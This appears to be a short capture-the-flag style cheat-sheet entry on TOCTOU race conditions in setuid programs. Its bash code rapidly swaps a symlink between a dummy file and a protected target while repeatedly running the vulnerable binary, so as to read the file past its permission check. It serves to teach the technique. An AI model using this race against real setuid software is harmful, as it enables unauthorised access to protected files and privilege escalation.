In case a file permission check is happened before the file is read/written (or after - just in a different time), you can modify the file in between in order to trick the permission check.
It is used in setuid programs.
### Example exploitation
In order to perform it, you can switch between a "dummy" file you have permissions for and the actual flag file very quickly. Here is the code: 
start:
```bash
touch dummy
```
process 1:
```bash
while true; do
	ln -sf goal flipped
	ln -sf dummy flipped
done &
```
(& in the end means to run in background)
process 2: (or just do it manually)
```bash
for i in {1..100}; do
	./vulnerable-file flipped >> out
done
```
Out will contain all the outputs from successful runs, you can filter it using `uniq` or `grep` if necessary.

Another possibility is to use bash to start the vulnerable-file in background and immediately swap the files.
